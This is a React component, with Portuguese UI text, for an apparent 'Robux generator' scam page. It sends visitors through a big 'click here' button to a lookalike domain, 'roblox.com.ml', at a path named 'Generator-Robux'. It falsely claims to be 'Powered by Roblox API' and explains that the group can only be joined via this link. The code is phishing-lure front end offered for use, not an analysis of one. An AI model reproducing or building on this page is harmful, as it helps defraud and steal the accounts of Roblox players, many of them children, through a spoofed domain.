"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"

interface GroupInstructionsProps {
  onCancel: () => void
}

export function GroupInstructions({ onCancel }: GroupInstructionsProps) {
  const [groupLink, setGroupLink] = useState("https://www.roblox.com.ml/communities/5771900249/Generator-Robux")

  useEffect(() => {
    fetch("/api/settings")
      .then((res) => res.json())
      .then((data) => {
        if (data.groupLink) {
          setGroupLink(data.groupLink)
        }
      })
  }, [])

  const handleGroupClick = () => {
    window.open(groupLink, "_blank")
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 relative overflow-hidden">
      {/* Background decorativo */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute top-20 left-10 w-32 h-32 bg-primary/20 rounded-full blur-3xl" />
        <div className="absolute bottom-20 right-10 w-40 h-40 bg-secondary/20 rounded-full blur-3xl" />
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-64 h-64 bg-accent/10 rounded-full blur-3xl" />
      </div>

      <Card className="w-full max-w-lg p-8 relative z-10 border-2 border-primary/30 bg-card/95 backdrop-blur">
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-20 h-20 bg-[#22c55e]/20 rounded-2xl mb-4 shadow-lg shadow-[#22c55e]/30">
            <svg className="w-12 h-12 text-[#22c55e]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
              />
            </svg>
          </div>
          <h1 className="text-3xl font-bold mb-6 text-balance">Instruções Importantes</h1>
        </div>

        <div className="space-y-6 mb-8">
          <Card className="p-6 bg-muted/50 border-2 border-border">
            <p className="text-foreground text-lg leading-relaxed text-center">
              Grupo Não é Verificado Pela Roblox Ainda Então Ele Não Aparece Na Busca De Comunidades Do Roblox.
            </p>
          </Card>

          <Card className="p-6 bg-muted/50 border-2 border-border">
            <p className="text-foreground text-lg leading-relaxed text-center">
              Somente Dá Para Entrar Via <span className="text-[#22c55e] font-bold">Link</span>
            </p>
          </Card>
        </div>

        <div className="space-y-4">
          <Button
            onClick={handleGroupClick}
            className="w-full h-16 text-lg font-bold bg-[#22c55e] hover:bg-[#22c55e]/90 text-white shadow-lg shadow-[#22c55e]/30 transition-all hover:shadow-xl hover:shadow-[#22c55e]/40 hover:scale-105 flex flex-col gap-1"
          >
            <span>Grupo Aqui</span>
            <span className="text-sm font-normal opacity-90">Clique Aqui</span>
          </Button>

          <Button
            onClick={onCancel}
            variant="outline"
            className="w-full h-12 text-lg font-bold border-2 hover:bg-muted bg-transparent"
          >
            Voltar ao Início
          </Button>
        </div>

        <div className="mt-6 flex items-center justify-center gap-2 text-sm text-muted-foreground">
          <div className="w-2 h-2 bg-secondary rounded-full animate-pulse" />
          <span>Powered by Roblox API</span>
        </div>
      </Card>

      <div className="mt-6 flex items-center justify-center gap-2 text-sm text-muted-foreground relative z-10">
        <div className="w-2 h-2 bg-[#22c55e] rounded-full animate-pulse" />
        <span>By Soneca</span>
      </div>
    </div>
  )
}
